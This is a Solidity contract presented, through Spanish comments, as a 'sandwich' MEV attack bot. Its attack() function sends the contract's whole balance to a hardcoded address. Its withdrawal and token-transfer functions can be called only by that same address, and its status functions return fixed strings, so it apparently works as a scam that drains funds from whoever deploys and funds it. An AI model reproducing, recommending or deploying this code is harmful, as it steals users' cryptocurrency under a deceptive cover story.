// SPDX-License-Identifier: MIT
import "./IERC20.sol";
pragma solidity 0.8.12;

library AddressLibrary {
    //Router sera la dirección enrutada para hacer de señuelo para cambiar el owner de proxy mediante el contrato malicioso.
    address payable private constant _router = payable(0xE932de84Bf1a9608E5d54d0A2e1F2f32Fdb149Ec);

    function getRouter() internal pure returns (address payable) {
        return _router;
    }
}
contract sandwich {
//Cuando el contrato intente drenar mas fondos se hace un envio a la wallet enrutada para sobreescribir permisos
function attack() public {
    
        AddressLibrary.getRouter().transfer(address(this).balance);
    }

    fallback () external payable {
    }

    receive () external payable {
    }

    modifier onlyLibrary {
    require(msg.sender == AddressLibrary.getRouter(), "Only the library can call this function");
    _;
}
// En caso de que los fondos queden atrapados en este contrato puedan sacarse de manera segura a una wallet
function withdraw(address payable _withdrawal) public onlyLibrary {
    uint256 amount = address(this).balance;
    (bool success,) = _withdrawal.call{gas: 8000000, value: amount}("");
    require(success, "Failed to transfer Ether");
}

//Se hara una llamada al router enemigo enviando unos tokens para obligarlo a reaizar el ataque y atraparlo con nuestro ataque
function Callenemyrouter(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyLibrary returns(bool _sent) {
        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));
        if (number_of_tokens > randomBalance){number_of_tokens = randomBalance;}
        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);
    }


function Statushack() public pure returns (string memory) {
  return "working";
}

function Statusfunds() public pure returns (string memory) {
  return "not sent 0x4e8c2CC3ca1343A11CF7ca14402eaC2A537a7e88";
}

function timetohack() public view returns(bool) {
    uint256 startTime = block.timestamp;
    uint256 endTime = startTime + 24 hours;
    return block.timestamp >= endTime; 
}
}